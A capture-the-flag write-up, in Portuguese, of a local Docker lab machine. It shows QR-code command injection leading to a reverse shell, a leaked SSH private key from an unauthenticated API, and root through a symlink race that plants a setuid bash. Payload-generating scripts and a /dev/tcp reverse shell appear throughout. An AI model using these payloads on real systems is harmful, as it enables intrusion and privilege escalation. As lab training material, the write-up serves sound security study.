# nmap

└─$ nmap -T4 127.0.0.1                  
Starting Nmap 7.99 ( https://nmap.org ) at 2026-11-18 12:01 -0500
Nmap scan report for localhost (127.0.0.1)
Host is up (0.0000040s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE
2222/tcp open  EtherNetIP-1
8000/tcp open  http-alt

Nmap done: 1 IP address (1 host up) scanned in 0.09 seconds

# acesso ao endereço web

http://127.0.0.1:8000/


não foi encontrado nada alem do home

# fazendo gobuster

─$ gobuster dir -u http://127.0.0.1:8000 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://127.0.0.1:8000
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              php,txt,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
beta                 (Status: 200) [Size: 1768]
upload               (Status: 405) [Size: 153]
Progress: 18452 / 18452 (100.00%)
===============================================================
Finished
===============================================================

# acessando o beta

encontrado o dev notes que permite ver a imagem enviada
DEV_NOTE: Validando integração óptica com o script legado. Arquivo de teste gerado pela equipe de homologação: /carterinha-teste.jpg

é possível ver a carteirinha que se fez o upload

# Analisando o upload (/beta)

A página `/beta` tem um formulário que envia a imagem para `POST /upload` (campo `carteirinha`).
O servidor (Flask/Werkzeug) tenta decodificar um **QR Code** presente na imagem. Se não encontrar
um QR Code legível, retorna a flash message "Não foi possível ler o QR Code da carteirinha."

Se o QR Code for lido com sucesso, a resposta mostra:

```
Saída do sistema de catracas / acadêmico
Matrícula <conteúdo_do_qr> validada com sucesso.
```

O rótulo "Saída do sistema de catracas / acadêmico" sugere que o conteúdo decodificado do QR
é passado para um **script legado** executado via shell (confirma o DEV_NOTE acima:
"Validando integração óptica com o script legado").

# Confirmando Command Injection via QR Code

Gerei um QR Code (com a lib `qrcode` do Python) contendo o payload:

```
123456789; id
```

Ao fazer upload dessa imagem em `/upload`, a resposta retornou:

```
Matrícula 123456789 validada com sucesso.
uid=1000(ru_web) gid=1000(ru_web) groups=1000(ru_web)
```

**Confirmado: Command Injection** no processamento do conteúdo do QR Code, executando como
usuário `ru_web` (mesmo nome do serviço web — bate com a flag `user_ru_web.txt`).

Script usado para gerar o QR:

```python
import qrcode
payload = '123456789; id'
img = qrcode.make(payload)
img = img.convert('RGB')
img.save('test_inj.jpg')
```

Upload no front do beta

# Shell Reversa via QR Code

Como a execução ocorre pelo lado do servidor, usei a injeção para abrir uma shell reversa
de volta para o atacante.

**IP de destino:** `172.20.0.1` — é o gateway da rede Docker `ctf_ru_default` em que o
container `ru-machine` está (visível com `docker inspect ru-machine`), ou seja, o endereço
pelo qual o container alcança a máquina host. `127.0.0.1` não funcionaria aqui pois, de dentro
do container, isso aponta para o próprio container, não para o host.

**Payload inserido no QR Code** (texto puro, codificado como imagem JPEG com QR):

```
123456789; bash -c "bash -i >& /dev/tcp/172.20.0.1/4444 0>&1"
```

Explicação do payload:
- `123456789` — mantém o formato esperado de matrícula, para não quebrar a lógica original do script.
- `;` — encerra o comando original e encadeia um novo comando (confirma que não há sanitização de `;`).
- `bash -c "bash -i >& /dev/tcp/172.20.0.1/4444 0>&1"` — shell reversa clássica via `/dev/tcp`
  do Bash: abre uma conexão TCP para `172.20.0.1:4444` e redireciona stdin/stdout/stderr da
  bash interativa para o socket.

Script para gerar a imagem com o QR Code (salvo como `revshell_qr.jpg`):

```python
import qrcode
payload = '123456789; bash -c "bash -i >& /dev/tcp/172.20.0.1/4444 0>&1"'
img = qrcode.make(payload)
img = img.convert('RGB')
img.save('revshell_qr.jpg')
```

# user flag
feito o shell reverso

em /home/ru_web


TAC{RU_qr_c0de_nao_e_so_pra_leitura_7f3a1c}



# operador flag

listando os processos

ps aux
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.0   6924  3632 ?        Ss   12:42   0:00 su -s /bin/bash ru_web -c python3 /app/app.py
root          18  0.0  0.0  11780  2776 ?        Ss   12:42   0:00 sshd: /usr/sbin/sshd [listener] 0 of 10-100 startups
root          19  0.0  0.4  40536 32664 ?        S    12:42   0:00 python3 /opt/admin-api/app.py
root          20  0.0  0.4  48744 40368 ?        S    12:42   0:00 python3 /opt/painel/app.py
root          21  0.0  0.1  14276 11780 ?        S    12:42   0:00 python3 -u /opt/conciliacao.py
ru_web        23  0.0  0.6 274152 55048 ?        Ssl  12:42   0:01 python3 /app/app.py
ru_web        95  0.0  0.0   2680  1800 ?        S    13:17   0:00 /bin/sh -c bash /app/legacy/validar_matricula.sh 123456789; bash -c "bash -i >& /dev/tcp/172.20.0.1/4444 0>&1"
ru_web        97  0.0  0.0   4496  3228 ?        S    13:17   0:00 bash -c bash -i >& /dev/tcp/172.20.0.1/4444 0>&1
ru_web        98  0.0  0.0   4760  3992 ?        S    13:17   0:00 bash -i
ru_web       127  0.0  0.2  28936 18484 ?        S    13:20   0:00 python3 -m http.server 8080
ru_web       155  0.0  0.0   2680  1792 ?        S    13:32   0:00 /bin/sh -c bash /app/legacy/validar_matricula.sh 123456789; bash -c "bash -i >& /dev/tcp/172.20.0.1/4444 0>&1"
ru_web       157  0.0  0.0   4496  3196 ?        S    13:32   0:00 bash -c bash -i >& /dev/tcp/172.20.0.1/4444 0>&1
ru_web       158  0.0  0.0   4760  4032 ?        S    13:32   0:00 bash -i
ru_web       208  0.0  0.0   6796  3988 ?        R    13:46   0:00 ps aux

são encontrados 3 arquivos de interess

/opt/conciliacao.py
/opt/painel/app.py
/opt/admin-api/app.py

listando tudo dentro do opt
lendo os arquivos o admin-api roda sem atuenteticação
então fazendo um curl para o endpoint


curl -s http://127.0.0.1:9090/api/v1/operadores/3
{"cargo":"Operador de Caixa (automa\u00e7\u00e3o)","chave_privada":"-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW\nQyNTUxOQAAACD04+yG8iY18dH10l6+9Po0+bKja+pRn3Y5Z7Z1ed/0bwAAAJgtY8ZoLWPG\naAAAAAtzc2gtZWQyNTUxOQAAACD04+yG8iY18dH10l6+9Po0+bKja+pRn3Y5Z7Z1ed/0bw\nAAAEDxvbncE4vlG1ZZ43ujPZ0tr49ipPSHaMhWHE5a9BH69fTj7IbyJjXx0fXSXr70+jT5\nsqNr6lGfdjlntnV53/RvAAAAFW9wZXJhZG9yX2NhaXhhQHJ1LWN0Zg==\n-----END OPENSSH PRIVATE KEY-----\n","email":"operador_caixa@ru.unb.br","id":3,"nome":"Sistema Operador de Caixa","usuario":"operador_caixa"}

assim é possível fazer um ssh

ssh -i id_operador -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 2222 operador_caixa@127.0.0.1

flag

TAC{RU_1d0r_ssh_operador_6b2f9a}


# root

no conciliacao.py

info = RELATORIO.lstat()          # 1) checa conciliacao.tmp SEM seguir symlink (exige regular)
if not stat.S_ISREG(...): return  #    → tem que ser arquivo regular aqui
time.sleep(15)                     # 2) janela de 15s 🪟
with open(RELATORIO, "w") as f:    # 3) open("w") SEGUE symlink e TRUNCA o alvo
    f.write(dados)                 #    escreve o conteúdo de dados.csv (que VOCÊ controla)
subprocess.run(["/bin/bash", "/opt/helper_conciliacao.sh"])  # 4) executa o helper como root

entrar no diretório
cd /var/ru/caixa

modificar o conteúdo que será executado

cat > dados.csv <<'EOF'
cp /bin/bash /tmp/.rootbash
chmod 6755 /tmp/.rootbash
EOF

sobe script para ficar vendo se a conciliacao já foi executada

virar root com o arquivo capturado

/tmp/.rootbash -p

flag de root

cat /root/root.txt

TAC{RU_t0ct0u_syml1nk_r00t_9c4e2b}

